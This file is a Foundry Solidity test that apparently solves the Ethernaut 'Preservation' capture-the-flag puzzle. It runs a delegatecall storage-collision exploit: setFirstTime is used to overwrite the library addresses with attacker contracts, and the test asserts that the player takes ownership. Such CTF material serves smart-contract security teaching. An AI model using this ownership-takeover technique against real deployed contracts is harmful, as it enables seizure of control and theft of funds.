// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {Preservation, LibraryContract} from "../../src/puzzles/16/Preservation.sol";
import {PreservationAttacker1, PreservationAttacker2} from "../../src/attackers/16/PreservationAttacker.sol";

contract PreservationTest is Test {
    Preservation internal puzzleContract;
    LibraryContract internal libraryContract1;
    LibraryContract internal libraryContract2;
    PreservationAttacker1 internal attackerContract1;
    PreservationAttacker2 internal attackerContract2;

    address player = makeAddr("player");

    function setUp() public {
        libraryContract1 = new LibraryContract();
        libraryContract2 = new LibraryContract();
        puzzleContract = new Preservation(address(libraryContract1), address(libraryContract2));
        attackerContract1 = new PreservationAttacker1();
        attackerContract2 = new PreservationAttacker2();
    }

    function testPreservation() public {
        puzzleContract.setFirstTime(uint256(uint160(address(attackerContract1))));
        assertEq(puzzleContract.timeZone1Library(), address(attackerContract1));
        puzzleContract.setFirstTime(uint256(uint160(address(attackerContract2))));
        assertEq(puzzleContract.timeZone2Library(), address(attackerContract2));
        puzzleContract.setSecondTime(uint256(uint160(player)));
        assertEq(puzzleContract.owner(), player);
    }
}